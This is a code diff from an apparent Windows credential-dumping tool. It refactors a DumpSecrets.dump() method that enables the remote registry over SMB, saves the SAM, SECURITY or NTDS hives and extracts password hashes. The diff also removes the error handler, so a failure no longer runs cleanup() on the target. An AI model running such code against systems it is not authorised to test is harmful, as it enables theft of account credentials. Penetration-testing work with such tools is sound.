@@ -1700,44 +1700,36 @@ class DumpSecrets:
         return True
 
     def dump(self, smbconnection):
-        try:
-            self.__remoteOps = RemoteOperations(smbconnection)
-            self.__remoteOps.enableRegistry()
-            bootKey = self.__remoteOps.getBootKey()
+        self.__remoteOps = RemoteOperations(smbconnection)
+        self.__remoteOps.enableRegistry()
+        bootKey = self.__remoteOps.getBootKey()
 
-            # Let's check whether target system stores LM Hashes
-            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
-            SECURITYFileName = self.__remoteOps.saveSECURITY()
+        # Let's check whether target system stores LM Hashes
+        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+        SECURITYFileName = self.__remoteOps.saveSECURITY()
 
-            if self.__sam is True:
-                SAMFileName = self.__remoteOps.saveSAM()
+        if self.__sam is True:
+            SAMFileName = self.__remoteOps.saveSAM()
 
-                self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
-                self.dumped_sam_hashes = self.__SAMHashes.dump()
+            self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
+            self.dumped_sam_hashes = self.__SAMHashes.dump()
 
-            elif self.__ntds is True:
-                if self.__useVSSMethod:
-                    NTDSFileName = self.__remoteOps.saveNTDS()
-                elif self.__useNinjaMethod:
-                    NTDSFileName = self.__remoteOps.saveNTDS(ninja=True)
-                    self.__useVSSMethod = True
-                else:
-                    NTDSFileName = None
+        elif self.__ntds is True:
+            if self.__useVSSMethod:
+                NTDSFileName = self.__remoteOps.saveNTDS()
+            elif self.__useNinjaMethod:
+                NTDSFileName = self.__remoteOps.saveNTDS(ninja=True)
+                self.__useVSSMethod = True
+            else:
+                NTDSFileName = None
 
-                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, noLMHash=self.__noLMHash, remoteOps=self.__remoteOps, useVSSMethod=self.__useVSSMethod)
-                try:
-                    self.dumped_ntds_hashes = self.__NTDSHashes.dump()
-                except Exception, e:
-                    logging.error(e)
-                    if self.__useVSSMethod is False:
-                        logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
-
-        except (Exception, KeyboardInterrupt) as e:
-            traceback.print_exc()
+            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, noLMHash=self.__noLMHash, remoteOps=self.__remoteOps, useVSSMethod=self.__useVSSMethod)
             try:
-                self.cleanup()
-            except:
-                pass
+                self.dumped_ntds_hashes = self.__NTDSHashes.dump()
+            except Exception, e:
+                logging.error(e)
+                if self.__useVSSMethod is False:
+                    logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
 
     def cleanup(self):
         logging.info('Cleaning up... ')
